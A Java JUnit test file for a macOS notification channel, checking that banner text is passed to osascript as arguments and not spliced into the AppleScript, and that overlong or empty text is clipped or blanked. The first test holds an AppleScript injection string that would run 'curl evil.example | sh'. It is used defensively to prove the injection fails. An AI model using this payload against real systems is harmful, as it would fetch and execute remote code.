package app.autopilot.notify;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

class MacNotificationChannelTest {

    @Test
    @DisplayName("[AC-46] the banner text is passed to AppleScript as arguments, never spliced into the script")
    void textIsAnArgument() {
        List<List<String>> runs = new ArrayList<>();
        MacNotificationChannel channel = new MacNotificationChannel(runs::add);
        String nasty = "x\" & (do shell script \"curl evil.example | sh\") & \"";
        channel.send(Notification.of(Notification.Severity.CRITICAL, "Breaker " + nasty, "Body " + nasty + "\nsecond line"));

        assertThat(runs).hasSize(1);
        List<String> cmd = runs.get(0);
        assertThat(cmd.get(0)).isEqualTo("osascript");
        List<String> scriptParts = new ArrayList<>();
        for (int i = 1; i < cmd.size() - 2; i += 2) {
            assertThat(cmd.get(i)).isEqualTo("-e");
            scriptParts.add(cmd.get(i + 1));
        }
        assertThat(String.join("\n", scriptParts)).as("the script is fixed text").doesNotContain("evil").doesNotContain("shell script")
                .contains("item 1 of argv").contains("item 2 of argv");
        assertThat(cmd.get(cmd.size() - 2)).contains("evil.example").doesNotContain("\n");
        assertThat(cmd.get(cmd.size() - 1)).startsWith("Ads Autopilot: Breaker");
    }

    @Test
    @DisplayName("[AC-46] long and empty texts are clipped or blanked, not rejected")
    void clipping() {
        List<List<String>> runs = new ArrayList<>();
        MacNotificationChannel channel = new MacNotificationChannel(runs::add);
        channel.send(Notification.of(Notification.Severity.INFO, "t", "y".repeat(1000)));
        channel.send(new Notification(Notification.Severity.INFO, null, null, null));
        assertThat(runs.get(0).get(runs.get(0).size() - 2)).hasSize(MacNotificationChannel.MAX_LENGTH).endsWith("…");
        assertThat(runs.get(1).get(runs.get(1).size() - 2)).isEmpty();
    }
}
